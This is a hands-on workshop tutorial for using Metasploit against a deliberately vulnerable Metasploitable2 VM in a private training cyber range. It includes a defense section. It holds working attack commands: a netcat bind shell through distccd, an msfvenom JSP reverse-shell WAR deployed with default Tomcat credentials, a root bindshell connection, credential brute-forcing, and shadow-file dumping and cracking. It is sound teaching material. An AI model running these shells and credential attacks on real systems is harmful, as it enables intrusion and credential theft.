# Warning
This workshop is for educational purposes only.
Ethical hacking is conducted with the explicit permission of the system owner to improve security.
Every command in this document targets the WOCSA CyberRange (10.5.20.12) only. Never run these techniques against systems you do not own or are not authorized to test.

# Table of Contents

- [Warning](#warning)
- [Table of Contents](#table-of-contents)
- [Introduction](#introduction)
  - [What is Metasploit?](#what-is-metasploit)
  - [Why Metasploitable2?](#why-metasploitable2)
- [Prerequisites](#prerequisites)
- [Target discovery](#target-discovery)
- [Metasploit workflow](#metasploit-workflow)
  - [The 5 steps](#the-5-steps)
  - [RHOSTS, RPORT and LHOST](#rhosts-rport-and-lhost)
- [Exploitation walkthroughs](#exploitation-walkthroughs)
  - [1. distccd command execution (port 3632)](#1-distccd-command-execution-port-3632)
  - [2. Tomcat manager WAR deploy (port 8180)](#2-tomcat-manager-war-deploy-port-8180)
  - [3. The 1524 root bindshell](#3-the-1524-root-bindshell)
  - [4. Credential attacks: msfadmin and anonymous Samba](#4-credential-attacks-msfadmin-and-anonymous-samba)
  - [The famous backdoors — and how to verify a claim](#the-famous-backdoors--and-how-to-verify-a-claim)
- [Post-exploitation basics](#post-exploitation-basics)
  - [Managing sessions](#managing-sessions)
  - [Meterpreter vs plain shell](#meterpreter-vs-plain-shell)
- [Password dumping](#password-dumping)
- [Lateral movement teaser](#lateral-movement-teaser)
- [Defense & detection](#defense--detection)
- [Takeaways checklist](#takeaways-checklist)
- [Resources](#resources)

# Introduction

## What is Metasploit?

Metasploit is the most widely used open-source penetration testing framework. It organizes offensive knowledge into reusable, well-tested components:

- **Modules** — the building blocks: `exploit` (how to trigger a vulnerability), `payload` (what to run on the target), `auxiliary` (scanners, fuzzers, brute-forcers), `post` (post-exploitation actions).
- **Payloads** — the code delivered after a successful exploit. They come in two families: *bind* payloads (the target opens a port and waits for you) and *reverse* payloads (the target connects back to you). Meterpreter is the advanced payload providing a rich command set; plain `cmd/unix` payloads just spawn a shell or run a command.
- **Sessions** — live connections to compromised machines. Each successful exploit opens a session you can list, interact with, background and re-enter.

## Why Metasploitable2?

Metasploitable2 is a deliberately vulnerable Linux VM built by Rapid7 as a training target. It runs old, backdoored or misconfigured services (distccd, Tomcat, Samba, the famous 1524 bindshell...) precisely so that every port teaches a lesson. In the WOCSA CyberRange it plays the role of a legacy internal server that was never patched — the perfect first machine to pwn.

# Prerequisites

1. **The CyberRange is up**: start it from the repository root:
   ```bash
   cd CyberRange
   docker compose up -d
   ```
   Metasploitable2 runs on the **intranet** profile at `10.5.20.12`, with no published port on the host.

2. **A way to reach the intranet**, either:
   - **VPN peer** (recommended): open the wg-easy admin UI at `http://localhost:51821` (credentials in `CyberRange/.env`), click **New**, import the generated `.conf` in your WireGuard client and activate the tunnel (full steps in the [CyberRange README](../../CyberRange/README.md#the-vpn-like-a-real-company)). Verify with:
     ```bash
     ping 10.5.20.12
     ```
   - **kali-cai container**: the WOCSA AI offensive stack ships a Kali container that is dual-homed on the DMZ (10.5.10.30) and the intranet (10.5.20.30). Start it and jump in:
     ```bash
     cd AI/offensive
     docker compose up -d
     docker exec -it kali-cai bash
     ```
     Inside, `msfconsole`, `nmap`, `nc`, `john`, `hydra` and `sqlmap` are already installed, and it reaches `10.5.20.12` directly through its intranet leg.
   - **metasploit-mcp container**: the same AI stack builds a Kali container with the apt-installed Metasploit (`msfconsole` 6.x). It is attached to the DMZ (`10.5.10.31`); attach it to the intranet too for this workshop:
     ```bash
     docker network connect cyberrange-intranet metasploit-mcp
     docker exec -it metasploit-mcp msfconsole
     ```

3. **Metasploit installed**: either your own Kali (`msfconsole --version`) or one of the two containers above.

> Briefly: the `metasploit-mcp` container also runs `msfrpcd` (RPC on port 55553) and a `gc-metasploit` SSE server on 8085, so an AI agent can drive Metasploit. This workshop uses `msfconsole` interactively — the MCP server is covered in the [AI offensive workshop](../../AI/offensive/README.md).

# Target discovery

Start with a service scan of the target:

```bash
nmap -sV 10.5.20.12
```

Verified live output on the CyberRange (Metasploitable2, intranet only):

```
Nmap scan report for 10.5.20.12
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 2.3.4
22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
23/tcp   open  telnet      Linux telnetd
25/tcp   open  smtp        Postfix smtpd
111/tcp  open  rpcbind
139/tcp  open  netbios-ssn Samba
445/tcp  open  netbios-ssn Samba
512/tcp  open  exec
513/tcp  open  login
514/tcp  open  shell
1099/tcp open  rmiregistry
1524/tcp open  ingreslock
2121/tcp open  ftp         ProFTPD 1.3.1
3306/tcp open  mysql
3632/tcp open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
5432/tcp open  postgresql
6667/tcp open  irc         UnrealIRCd
6697/tcp open  irc
8009/tcp open  ajp13       Apache Jserv (Protocol v1.3)
8180/tcp open  http        Apache Tomcat/Coyote JSP engine 1.1
8787/tcp open  drb
```

Three immediate observations:

1. **distccd on 3632** — a compiler daemon exposed to the network with no authentication. Exploitable (verified, see below).
2. **Tomcat on 8180** — a Java app server with default manager credentials. Exploitable (verified, see below).
3. **1524** — the famous Metasploitable root bindshell: connect and you are root, no password, no exploit needed (verified, see below).

Classic credentials also work out of the box: `msfadmin` / `msfadmin` on SSH (22) and telnet (23) — try `ssh msfadmin@10.5.20.12` if you want the "password spraying" lesson before any exploit.

# Metasploit workflow

## The 5 steps

Every Metasploit exploitation follows the same loop:

1. **search** — find the right module:
   ```
   search distcc
   ```
2. **use** — load the module:
   ```
   use exploit/unix/misc/distcc_exec
   ```
3. **show options** — see what the module needs:
   ```
   show options
   ```
4. **set** — fill in the required options:
   ```
   set RHOSTS 10.5.20.12
   ```
5. **exploit** (or `run`) — fire:
   ```
   exploit
   ```

The `search` keyword usually matches the service name, the CVE or the version — try `search tomcat`, `search samba`, `search irc`.

## RHOSTS, RPORT and LHOST

- **RHOSTS** — the target address (`10.5.20.12`). Always required.
- **RPORT** — the target port. Every module has a sensible default (3632 for distcc, 8180 for Tomcat), so you rarely change it — but always check with `show options`.
- **LHOST** — *your* address, required only by **reverse** payloads: the exploited machine must know where to connect back to. In the CyberRange:
  - from kali-cai: `set LHOST 10.5.20.30` (its intranet leg — routable from 10.5.20.12);
  - from your own Kali over the VPN: `set LHOST 10.99.0.x` (your WireGuard tunnel IP — check it with `ip a show wg0` or in the wg-easy admin UI).

  The target is on a routable intranet subnet, so reverse shells work in both cases. **Bind** payloads (the target opens a port and waits for you) need no `LHOST` at all.

# Exploitation walkthroughs

The four walkthroughs below were **verified live against the CyberRange**. Where the classic Vulnhub VM and the container image differ, it is said explicitly — verifying before exploiting is itself one of the lessons of this workshop.

## 1. distccd command execution (port 3632)

`distcc` is a distributed compiler daemon. Exposed to the network without authentication, it happily compiles and *executes* arbitrary commands for anyone — a classic case of "developer tool left on a production server".

```
msfconsole
use exploit/unix/misc/distcc_exec
show options
set RHOSTS 10.5.20.12
set RPORT 3632
run
```

On recent Metasploit builds, the module defaults to a reverse-bash payload that assumes the target's bash supports `/dev/tcp` — which the Metasploitable2 container's busybox-style shell does **not** (verified: `bash: /dev/tcp/...: No such file or directory`). The reliable payload here is `cmd/unix/generic`, which just runs one command and prints the output:

```
set PAYLOAD cmd/unix/generic
set CMD id
run
```

**Verified result**:

```
[*] 10.5.20.12:3632 - stdout: uid=1(daemon) gid=1(daemon) groups=1(daemon)
[*] Exploit completed, but no session was created.
```

`cmd/unix/generic` does not open a session — it is a fire-and-forget command execution. That is enough to prove code execution; for an interactive shell, run a *bind* shell through it (or move to the Tomcat walkthrough):

```
set CMD "nc -l -p 4550 -e /bin/sh"
run
```

then from your machine: `nc 10.5.20.12 4550`. (This is the moment you discover that `nc` on the target may be the traditional variant that supports `-e`.)

This is the teaching moment of the workshop: not every exploit gives you root, the service's own privileges limit you. distccd runs as **daemon**, so that is what you get — then you escalate (hint: the port 1524 bindshell is already root, and Metasploitable2 is full of privilege escalation exercises — see the [Privesc workshops](../../Privesc/Linux/README.md)).

## 2. Tomcat manager WAR deploy (port 8180)

Apache Tomcat 5.5 runs on 8180 with the manager webapp protected by the default credentials `tomcat` / `tomcat` — verified:

```bash
curl -s -u tomcat:tomcat http://10.5.20.12:8180/manager/html -o /dev/null -w "%{http_code}\n"
# 200
```

With manager access, you can deploy your own web application — and a JSP reverse shell packaged as a WAR is the classic move:

1. Build the payload with `msfvenom` (on kali-cai):
   ```bash
   msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.5.20.30 LPORT=4600 -f war -o /tmp/shell.war
   ```
   (`LHOST` = your intranet address; on the VPN use your `10.99.0.x` instead.)
2. Deploy it through the manager API:
   ```bash
   curl -s -u tomcat:tomcat --upload-file /tmp/shell.war \
     "http://10.5.20.12:8180/manager/deploy?path=/shell"
   # OK - Deployed application at context path /shell
   ```
3. Start a listener and trigger the shell:
   ```bash
   nc -lvp 4600
   ```
   then in a second terminal: `curl http://10.5.20.12:8180/shell/` — verified: the target connects back (`connect to [...] from 10.5.20.12`).
4. Clean up afterwards (good manners in a shared lab):
   ```bash
   curl -s -u tomcat:tomcat "http://10.5.20.12:8180/manager/undeploy?path=/shell"
   ```

The Metasploit equivalent is the `exploit/multi/http/tomcat_mgr_deploy` module (same verified credentials):

```
use exploit/multi/http/tomcat_mgr_deploy
set RHOSTS 10.5.20.12
set RPORT 8180
set HttpUsername tomcat
set HttpPassword tomcat
set LHOST 10.5.20.30
exploit
```

## 3. The 1524 root bindshell

Port 1524 is not a vulnerability to exploit — it is a deliberate root shell (xinetd runs `nc` bound to it). Connect and you are root:

```bash
nc 10.5.20.12 1524
id
```

**Verified result**: `uid=0(root) gid=0(root) groups=0(root)`.

It is the fastest "get root" of the range, which makes it the perfect bootstrap shell for pivoting exercises — and a great reminder that a "backdoor port" is just an undocumented service: this is what defenders must hunt for (`netstat -tlnp` on every box!).

## 4. Credential attacks: msfadmin and anonymous Samba

Two verified credential findings, both without any exploit:

- **Default login**: `msfadmin` / `msfadmin` on telnet (23) and SSH (22).
- **Anonymous Samba access** on the `tmp` share — read *and write*:
  ```bash
  smbclient -L 10.5.20.12 -N                      # anonymous share listing
  smbclient "//10.5.20.12/tmp" -N -c "ls"         # anonymous read
  smbclient "//10.5.20.12/tmp" -N -c "put file.txt"  # anonymous write
  ```

To weaponize the search for default credentials, use Metasploit's auxiliary modules:

```
use auxiliary/scanner/ssh/ssh_login
set RHOSTS 10.5.20.12
set USERNAME msfadmin
set PASSWORD msfadmin
run
```

(or the equivalent `telnet_login` module). Same idea with `hydra`:

```bash
hydra -l msfadmin -P /tmp/words.txt telnet://10.5.20.12
```

## The famous backdoors — and how to verify a claim

Every Metasploitable2 write-up mentions the **vsftpd 2.3.4 backdoor** (a smiley-face username spawns a root shell on port 6200) and the **UnrealIRCd 3.2.8.1 backdoor** (an `AB; <command>` debug message executes a command). On the classic Vulnhub VM both work. On the CyberRange, the container image ships the same *versions* but — verified live — **the backdoor code is not present**:

- `strings /usr/sbin/vsftpd | grep 6200` returns nothing, and a `USER test:)` login does not open port 6200.
- `strings /usr/bin/unrealircd | grep -c "AB;"` returns 0, and the `AB;` debug message is answered with `Unknown command`.

This is not a bug in the range — it is the best lesson of the workshop:

1. **Version numbers lie.** `vsftpd 2.3.4` in the banner does not guarantee the trojaned binary: the image was built from patched sources. The banner says 2.3.4; the code says otherwise.
2. **Verify before exploiting.** Before firing a module, check the fingerprint yourself (`strings`, a manual trigger, the module's own checks). Metasploit's `check` command does exactly this when the module implements it:
   ```
   use exploit/unix/ftp/vsftpd_234_backdoor
   set RHOSTS 10.5.20.12
   check
   ```
3. **Failures are findings.** "The exploit did not work" + "here is why" is a perfectly valid workshop outcome — it is what real assessments look like.

Exercise: run `check` (or a manual trigger) for `exploit/unix/ftp/vsftpd_234_backdoor` and `exploit/unix/irc/unreal_ircd_3281_backdoor` against `10.5.20.12` and explain the result with what you know from the `strings` check above.

# Post-exploitation basics

## Managing sessions

```
sessions          # list open sessions
sessions -i 1     # interact with session 1
background        # (or Ctrl+Z) put the current session back in the background
sessions -k 1     # kill session 1
```

Keep several sessions alive — one per exploit — and switch between them with `sessions -i`. (Note: `cmd/unix/generic` does not create a session; the Tomcat WAR shell and `ssh_login` do.)

## Meterpreter vs plain shell

The modules above use `cmd/unix/*` payloads: plain command shells on the target. **Meterpreter** (the rich, staged payload with `sysinfo`, `getuid`, `hashdump`, `download`, etc.) is typical of Windows targets; on this Linux box you will mostly get a plain root shell. So on the target side, use classic shell commands:

```
id
uname -a
cat /etc/passwd
```

# Password dumping

Once root, dump the shadow file:

```
cat /etc/shadow
```

On the CyberRange's Metasploitable2 you will see the image's default hashes:

```
root:$1$/avpfBJ1$x0z8w5UF9Iv./DR9E9Lid.:...
msfadmin:$1$XN10Zj2c$Rt/zzCW3mLtUWA.ihZjA5/:...
```

Exercise — try to crack them with John the Ripper (installed in kali-cai):

```
cp /etc/passwd /tmp/passwd.txt
cp /etc/shadow /tmp/shadow.txt
unshadow /tmp/passwd.txt /tmp/shadow.txt > /tmp/hashes.txt
john --wordlist=/usr/share/wordlists/rockyou.txt /tmp/hashes.txt
john --show /tmp/hashes.txt
```

**Reality check**: these are the shared image's default hashes — try john with a small wordlist by all means, but the image is shared and the hashes may not crack with trivial dictionaries. That is normal, and it is the real lesson: password cracking is probabilistic, not magic. The full cracking methodology is the [Password cracking workshop](../PasswordCracking/Password_Cracking.md).

# Lateral movement teaser

From Metasploitable2 you are now *deep inside the intranet* — one hop away from the whole company:

- `10.5.20.10` — intranet wiki
- `10.5.20.11` — internal file server
- `10.5.20.20` — DVWA's intranet leg (the pivot service)
- `10.5.20.21` / `10.5.20.22` — employee workstations
- `10.5.20.14` — Grafana monitoring (default creds `admin` / `admin`...)

And on the *other side* of the DMZ bridge: the mailpit API at `10.5.10.13:8025` — reading the company inbox is the endgame, but Docker's inter-network isolation stands in the way. Getting there is the art of **pivoting**: see the [Pivoting workshop](../Pivoting/Pivoting_Lateral_Movement.md) and the [Pivoting and isolation](../../CyberRange/README.md#pivoting-and-isolation) section of the CyberRange README.

# Defense & detection

How would a defender stop every attack in this workshop?

- **Patch.** distccd (2004), Tomcat 5.5 (2007) and Samba 3.0.20 (2007) were all fixed or end-of-lifed years ago. The vulnerabilities exist only because the software was never updated — "we don't patch legacy systems" is how the intranet got owned.
- **Change default credentials.** `tomcat/tomcat` and `msfadmin/msfadmin` were enough to walk in. A default-credential scan (Metasploit auxiliaries, or any vuln scanner) finds these in seconds — so should you, in your own network.
- **Why backdoors happen**: the two famous ones (vsftpd, UnrealIRCd) came from *compromised upstream tarballs* — verify download signatures and monitor your supply chain, not just your own code. And note the range's twist: version numbers alone would have made you fire exploits at a patched binary — banner versioning is not a vulnerability.
- **Don't expose dev tools**: distccd has no authentication because it was never meant to face a network. Default-deny firewall rules and "no service unless needed" policies kill this whole class.
- **Hunt for undocumented listeners**: the 1524 bindshell is exactly what `netstat -tlnp` reviews are for.
- **Segmentation limits the blast radius**: Metasploitable2 has no published port — it is intranet-only. An attacker must first get VPN access or pivot through DVWA to even *see* it. That is segmentation doing its job: the box was pwnable, but it was not reachable from the Internet.

# Takeaways checklist

- [ ] I can explain the 5-step Metasploit workflow (search / use / show options / set / exploit)
- [ ] I know what RHOSTS, RPORT and LHOST mean, and when LHOST is required
- [ ] I got command execution on distccd (3632) as the `daemon` user with `cmd/unix/generic`
- [ ] I deployed a JSP reverse shell WAR on Tomcat (8180) with `tomcat/tomcat` and caught the shell
- [ ] I used the 1524 root bindshell and explained why it is a finding, not an exploit
- [ ] I verified — not assumed — that the famous vsftpd/UnrealIRCd backdoors are absent from this image
- [ ] I understand the difference between a bind payload and a reverse payload
- [ ] I know the difference between a plain shell and meterpreter
- [ ] I dumped `/etc/shadow` and tried John on the hashes (and know why it may not crack)
- [ ] I can name at least 3 defensive controls that would have stopped each attack

# Resources

- [Metasploit documentation (Rapid7)](https://docs.rapid7.com/metasploit/)
- [Metasploitable2 guide (Rapid7)](https://docs.rapid7.com/metasploitable/)
- [Metasploit Unleashed (Offensive Security)](https://www.offsec.com/metasploit-unleashed/)
- [WOCSA CyberRange README](../../CyberRange/README.md)
- [Nmap fundamentals workshop](../NMAP/NMAP_fundamentals.md) — the discovery step before exploitation
- [Pivoting & lateral movement workshop](../Pivoting/Pivoting_Lateral_Movement.md) — what to do once you are in
- [Password cracking workshop](../PasswordCracking/Password_Cracking.md) — the hashes you just dumped
